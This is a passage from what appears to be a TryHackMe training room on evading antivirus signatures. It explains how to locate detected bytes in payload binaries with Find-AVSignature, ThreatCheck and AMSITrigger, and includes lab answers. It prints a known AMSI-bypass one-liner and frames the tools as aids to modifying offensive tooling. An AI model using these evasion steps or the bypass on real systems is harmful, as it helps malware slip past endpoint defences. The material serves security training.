style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">  </span><span class="textcol" style="color:rgb(0, 0, 0)" data-pf_style_display="inline" data-pf_style_visibility="visible">,.Â¬)Â£â€°Ã‡.Ã©.....2Â¬</span></div></span></pre><p data-pf_style_display="block" data-pf_style_visibility="visible">We have the location of a signature; how human-readable it is will be determined by the tool itself and the compilation method.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">
</p><p data-pf_style_display="block" data-pf_style_visibility="visible">Nowâ€¦ no one wants to spend hours going back and forth trying to track down bad bytes; letâ€™s automate it! In the next task, we will look at a few <strong data-pf_style_display="inline" data-pf_style_visibility="visible">FOSS</strong> (<strong data-pf_style_display="inline" data-pf_style_visibility="visible">F</strong>ree and <strong data-pf_style_display="inline" data-pf_style_visibility="visible">O</strong>pen-<strong data-pf_style_display="inline" data-pf_style_visibility="visible">S</strong>ource <strong data-pf_style_display="inline" data-pf_style_visibility="visible">S</strong>oftware) solutions to aid us in identifying signatures in compiled code.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div data-pf_style_display="block" data-pf_style_visibility="visible">Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                Using the knowledge gained throughout this task, split the binary found in <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">C:\Users\Student\Desktop\Binaries\shell.exe</code> using a native utility discussed in this task. Recursively determine if the split binary is detected until you have obtained the nearest kilobyte of the first signature.
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="1" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="2" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-success task-answer" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            Question Done
                        </button>
                        </div>
                        <div class="room-task-input-hint" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-dorange faded btn-noline task-hint" onclick="getHint(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <i class="fal fa-lightbulb" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Hint
                      </button>
                        </div>
                    </div><div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                <p data-pf_style_display="block" data-pf_style_visibility="visible">To the nearest kibibyte, what is the first detected byte?</p>
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *****" value="51000" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="2" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="2" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-success task-answer" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-3" data-pf_style_display="flex" data-pf_style_visibility="visible">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse3" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <a class="card-link" data-pf_style_display="inline" data-pf_style_visibility="visible">
                            <span class="task-dropdown-title hacker-green" data-pf_style_display="inline" data-pf_style_visibility="visible">Task 3                             <span class="task-dropdown-icon" data-pf_style_display="inline" data-pf_style_visibility="visible"><i class="fas fa-check-circle" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span></span> Automating Signature Identification
                            <span class="float-right" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="fas fa-chevron-down" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
                            <span class="task-resources" data-pf_style_display="block" data-pf_style_visibility="visible"></span>
                        </a>
                    </div>
                    <div id="collapse3" class="collapse show" data-parent="#taskContent" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <div class="card-body task-complete" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <div class="room-task-desc" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div class="room-task-desc-data" data-pf_style_display="block" data-pf_style_visibility="visible"> <p data-pf_style_display="block" data-pf_style_visibility="visible">The process shown in the previous task can be quite arduous. To speed it up, we can automate it using scripts to split bytes over an interval for us. <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/AntivirusBypass/Find-AVSignature.ps1" data-pf_style_display="inline" data-pf_style_visibility="visible">Find-AVSignature</a> will split a provided range of bytes through a given interval.</p>
<div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Find-AVSignature
        </div>
        <pre class="terminal-code language-powershell" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           
<code class=" language-powershell" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">PS</span> C:\&gt; <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>\<span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">FInd-AVSignature</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>ps1
<span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">PS</span> C:\&gt; <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">Find-AVSignature</span>

cmdlet <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">Find-AVSignature</span> at command pipeline position 1
Supply values <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">for</span> the following parameters:
StartByte: 0
EndByte: max
Interval: 1000

<span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">Do</span> you want to <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">continue</span>?
This script will result in 1 binaries being written to <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"C:\Users\TryHackMe"</span><span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">!</span>
<span class="token namespace" data-pf_style_display="inline" data-pf_style_visibility="visible">[Y]</span> Yes  <span class="token namespace" data-pf_style_display="inline" data-pf_style_visibility="visible">[N]</span> No  <span class="token namespace" data-pf_style_display="inline" data-pf_style_visibility="visible">[S]</span> Suspend  <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">[</span>?<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">]</span> Help <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>default is <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"Y"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span>: y</code>
        </pre>
    </div>
</div>


<p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">This script relieves a lot of the manual work, but still has several limitations. Although it requires less interaction than the previous task, it still requires an appropriate interval to be set to function properly. This script will also only observe strings of the binary when dropped to disk rather than scanning using the full functionality of the anti-virus engine.</span></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">To solve this problem we can use other <strong data-pf_style_display="inline" data-pf_style_visibility="visible">FOSS</strong> (<strong data-pf_style_display="inline" data-pf_style_visibility="visible">F</strong>ree and <strong data-pf_style_display="inline" data-pf_style_visibility="visible">O</strong>pen-<strong data-pf_style_display="inline" data-pf_style_visibility="visible">S</strong>ource <strong data-pf_style_display="inline" data-pf_style_visibility="visible">S</strong>oftware) tools that leverage the engines themselves to scan the file, including <a href="https://github.com/matterpreter/DefenderCheck" data-pf_style_display="inline" data-pf_style_visibility="visible">DefenderCheck</a>, <a href="https://github.com/rasta-mouse/ThreatCheck" data-pf_style_display="inline" data-pf_style_visibility="visible">ThreatCheck</a>, and <a href="https://github.com/RythmStick/AMSITrigger" data-pf_style_display="inline" data-pf_style_visibility="visible">AMSITrigger</a>. In this task, we will primarily focus on ThreatCheck and briefly mention the uses of AMSITrigger at the end.</p>
<hr data-pf_style_display="block" data-pf_style_visibility="visible">
<h3 data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">ThreatCheck</span></h3>
<p data-pf_style_display="block" data-pf_style_visibility="visible">ThreatCheck is a fork of DefenderCheck and is arguably the most widely used/reliable of the three. To identify possible signatures, ThreatCheck leverages several anti-virus engines against split compiled binaries and reports where it believes bad bytes are present.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">ThreatCheck does not provide a pre-compiled release to the public. For ease of use we have already compiled the tool for you; it can be found in <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">C:\Users\Administrator\Desktop\Tools</code>of the attached machine.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Below is the basic syntax usage of ThreatCheck.</p>
<div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            ThreatCheck Help Menu
        </div>
        <pre class="terminal-code language-powershell" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible"><code class=" language-powershell" data-pf_style_display="block" data-pf_style_visibility="visible">C:\&gt;ThreatCheck<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>exe <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">--</span>help
  <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">-</span>e<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">--</span>engine    <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>Default: Defender<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span> Scanning engine<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span> Options: Defender<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> AMSI
  <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">-</span>f<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">--</span>file      Analyze a file on disk
  <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">-</span>u<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">--</span>url       Analyze a file <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">from</span> a URL
  <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">--</span>help          Display this help screen<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>
  <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">--</span>version       Display version information<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>
</code></pre></div></div>
<p data-pf_style_display="block" data-pf_style_visibility="visible">For our uses we only need to supply a file and optionally an engine; however, we will primarily want to use AMSITrigger when dealing with <strong data-pf_style_display="inline" data-pf_style_visibility="visible">AMSI</strong> (<strong data-pf_style_display="inline" data-pf_style_visibility="visible">A</strong>nti-<strong data-pf_style_display="inline" data-pf_style_visibility="visible">M</strong>alware <strong data-pf_style_display="inline" data-pf_style_visibility="visible">S</strong>can <strong data-pf_style_display="inline" data-pf_style_visibility="visible">I</strong>nterface), as we will discuss later in this task.</p>
<div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            ThreatCheck
        </div>
        <pre class="terminal-code language-powershell" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible"><code class=" language-powershell" data-pf_style_display="block" data-pf_style_visibility="visible">C:\&gt;ThreatCheck<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>exe <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">-</span>f Downloads\Grunt<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>bin <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">-</span>e AMSI
	<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">[</span><span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">+</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">]</span> Target file size: 31744 bytes
	<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">[</span><span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">+</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">]</span> Analyzing<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>
	<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">[</span><span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">!</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">]</span> Identified <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">end</span> of bad bytes at offset 0x6D7A
	00000000   65 00 22 00 3A 00 22 00  7B 00 32 00 7D 00 22 00   eÂ·<span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"Â·:Â·"</span>Â·<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">{</span>Â·2Â·<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">}</span>Â·<span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"Â·
	00000010   2C 00 22 00 74 00 6F 00  6B 00 65 00 6E 00 22 00   ,Â·"</span>Â·tÂ·oÂ·kÂ·eÂ·nÂ·<span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"Â·
	00000020   3A 00 7B 00 33 00 7D 00  7D 00 7D 00 00 43 7B 00   :Â·{Â·3Â·}Â·}Â·}Â·Â·C{Â·
	00000030   7B 00 22 00 73 00 74 00  61 00 74 00 75 00 73 00   {Â·"</span>Â·sÂ·tÂ·aÂ·tÂ·uÂ·sÂ·
	00000040   22 00 3A 00 22 00 7B 00  30 00 7D 00 22 00 2C 00   <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"Â·:Â·"</span>Â·<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">{</span>Â·0Â·<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">}</span>Â·<span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"Â·,Â·
	00000050   22 00 6F 00 75 00 74 00  70 00 75 00 74 00 22 00   "</span>Â·oÂ·uÂ·tÂ·pÂ·uÂ·tÂ·<span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"Â·
	00000060   3A 00 22 00 7B 00 31 00  7D 00 22 00 7D 00 7D 00   :Â·"</span>Â·<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">{</span>Â·1Â·<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">}</span>Â·<span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"Â·}Â·}Â·
	00000070   00 80 B3 7B 00 7B 00 22  00 47 00 55 00 49 00 44   Â·?Â³{Â·{Â·"</span>Â·GÂ·UÂ·IÂ·D
	00000080   00 22 00 3A 00 22 00 7B  00 30 00 7D 00 22 00 2C   Â·<span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"Â·:Â·"</span>Â·<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">{</span>Â·0Â·<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">}</span>Â·<span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"Â·,
	00000090   00 22 00 54 00 79 00 70  00 65 00 22 00 3A 00 7B   Â·"</span>Â·TÂ·yÂ·pÂ·eÂ·<span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"Â·:Â·{
	000000A0   00 31 00 7D 00 2C 00 22  00 4D 00 65 00 74 00 61   Â·1Â·}Â·,Â·"</span>Â·MÂ·eÂ·tÂ·a
	000000B0   00 22 00 3A 00 22 00 7B  00 32 00 7D 00 22 00 2C   Â·<span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"Â·:Â·"</span>Â·<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">{</span>Â·2Â·<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">}</span>Â·<span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"Â·,
	000000C0   00 22 00 49 00 56 00 22  00 3A 00 22 00 7B 00 33   Â·"</span>Â·IÂ·VÂ·<span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"Â·:Â·"</span>Â·<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">{</span>Â·3
	000000D0   00 7D 00 22 00 2C 00 22  00 45 00 6E 00 63 00 72   Â·<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">}</span>Â·<span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"Â·,Â·"</span>Â·EÂ·nÂ·cÂ·r
	000000E0   00 79 00 70 00 74 00 65  00 64 00 4D 00 65 00 73   Â·yÂ·pÂ·tÂ·eÂ·dÂ·MÂ·eÂ·s
	000000F0   00 73 00 61 00 67 00 65  00 22 00 3A 00 22 00 7B   Â·sÂ·aÂ·gÂ·eÂ·<span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"Â·:Â·"</span>Â·<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">{</span>
</code></pre></div></div>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Itâ€™s that simple! No other configuration or syntax is required and we can get straight to modifying our tooling. To efficiently use this tool we can identify any bad bytes that are first discovered then recursively break them and run the tool again until no signatures are identified.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Note: There may be instances of false positives, in which the tool will report no bad bytes. This will require your own intuition to observe and solve; however, we will discuss this further in task 4.</p>
<hr data-pf_style_display="block" data-pf_style_visibility="visible">
<h3 data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">AMSITrigger</span></h3>
<p data-pf_style_display="block" data-pf_style_visibility="visible">As covered in <a href="https://tryhackme.com/room/runtimedetectionevasion" data-pf_style_display="inline" data-pf_style_visibility="visible">Runtime Detection Evasion</a>, AMSI leverages the runtime, making signatures harder to identify and resolve. ThreatCheck also does not support certain file types such as PowerShell that AMSITrigger does.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">AMSITrigger will leverage the AMSI engine and scan functions against a provided PowerShell script and report any specific sections of code it believes need to be alerted on.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">AMSITrigger does provide a pre-compiled release on their GitHub and can also be found on the Desktop of the attached machine.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Below is the syntax usage of AMSITrigger</p>
<div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            AMSITrigger Help Menu
        </div>
        <pre class="terminal-code language-powershell" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible"><code class=" language-powershell" data-pf_style_display="block" data-pf_style_visibility="visible">C:\&gt;amsitrigger<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>exe <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">--</span>help
	<span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">-</span>i<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">--</span>inputfile=VALUE       Powershell filename
	<span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">-</span>u<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">--</span>url=VALUE             URL eg<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span> &lt;https:<span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">/</span><span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">/</span>10<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>1<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>1<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>1<span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">/</span><span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">Invoke-NinjaCopy</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>ps1&gt;
	<span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">-</span>f<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">--</span>format=VALUE          Output Format:
	                              1 <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">-</span> Only show Triggers
	                              2 <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">-</span> Show Triggers with Line numbers
	                              3 <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">-</span> Show Triggers inline with code
	                              4 <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">-</span> Show AMSI calls <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>xmas tree mode<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span>
	<span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">-</span>d<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">--</span>debug                 Show Debug Info
	<span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">-</span>m<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">--</span>maxsiglength=VALUE    Maximum signature Length to cater <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">for</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>
	                              default=2048
	<span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">-</span>c<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">--</span>chunksize=VALUE       Chunk size to send to AMSIScanBuffer<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>
	                              default=4096
	<span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">-</span>h<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">-</span>?<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">--</span>help              Show Help
</code></pre></div></div>
<p data-pf_style_display="block" data-pf_style_visibility="visible">For our uses we only need to supply a file and the preferred format to report signatures.</p>
<div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            AMSI Trigger Example
        </div>
        <pre class="terminal-code language-html" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible"><code class=" language-shell-session language-html" data-pf_style_display="block" data-pf_style_visibility="visible"></code><pre style="color:#bac8d4;font-size:1em" data-pf_style_display="block" data-pf_style_visibility="visible">PS C:\&gt; .\amsitrigger.exe -i bypass.ps1 -f 3
[Ref].Assembly.GetType('System.Management.Automation.<span style="color:red" data-pf_style_display="inline" data-pf_style_visibility="visible">AmsiUtils</span>').GetField('<span style="color:red" data-pf_style_display="inline" data-pf_style_visibility="visible">amsiInitFailed</span>','NonPublic,Static').SetValue($null,$true)
</pre></pre></div></div>
<p data-pf_style_display="block" data-pf_style_visibility="visible">In the next task we will discuss how you can use the information gathered from these tools to break signatures.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div data-pf_style_display="block" data-pf_style_visibility="visible">Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                Using the knowledge gained throughout this task, identify bad bytes found in <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">C:\Users\Student\Desktop\Binaries\shell.exe</code> using ThreatCheck and the Defender engine. ThreatCheck may take up to 15 minutes to find the offset, in this case you can leave it running in the background, continue with the next task, and come back when it finishes.
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="1" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="3" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-success task-answer" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            Question Done
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                <p data-pf_style_display="block" data-pf_style_visibility="visible">At what offset was the end of bad bytes for the file?&nbsp;</p>
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ******" value="0xC544" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="2" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="3" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-success task-answer" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-4" data-pf_style_display="flex" data-pf_style_visibility="visible">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse4" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <a class="card-link" data-pf_style_display="inline" data-pf_style_visibility="visible">
                            <span class="task-dropdown-title hacker-green" data-pf_style_display="inline" data-pf_style_visibility="visible">Task 4                             <span class="task-dropdown-icon" data-pf_style_display="inline" data-pf_style_visibility="visible"><i class="fas fa-check-circle" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span></span> Static Code-Based Signatures
                            <span class="float-right" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="fas fa-chevron-down" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
                            <span class="task-resources" data-pf_style_display="block" data-pf_style_visibility="visible"></span>
                        </a>
                    </div>
                    <div id="collapse4" class="collapse show" data-parent="#taskContent" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <div class="card-body task-complete" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <div class="room-task-desc" data-pf_style_display="flex" data-pf_style_visibility="visible">
